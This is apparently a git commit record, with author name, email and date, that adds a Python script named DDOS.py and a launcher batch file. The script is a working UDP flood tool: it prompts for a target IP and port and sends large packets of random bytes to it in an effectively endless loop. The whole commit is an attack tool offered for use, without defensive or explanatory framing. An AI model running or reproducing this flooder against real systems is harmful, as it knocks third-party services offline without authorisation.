db6d7161a98f9fece4d5a01209839028726da276
DESKTOP-31QJCO2\shokwave <tim.ku2004@gmail.com>
2023-02-16 18:52:04 +0200

    DDOS

---
+++ DDOS/DDOS.py
@@ -0,0 +1,16 @@
+import socket
+import random
+import time
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+ip = input("Enter Target IP: ")
+port = int(input("Enter Target Port: "))
+sleep = float(input("Sleep: "))
+
+s.connect((ip, port))
+
+for i in range(1, 100**1000):
+    s.send(random._urandom(10)*1000)
+    print(f"Send: {i}", end='\r')
+    time.sleep(sleep)
---
+++ DDOS/start.bat
@@ -0,0 +1,1 @@
+py DDOS.py
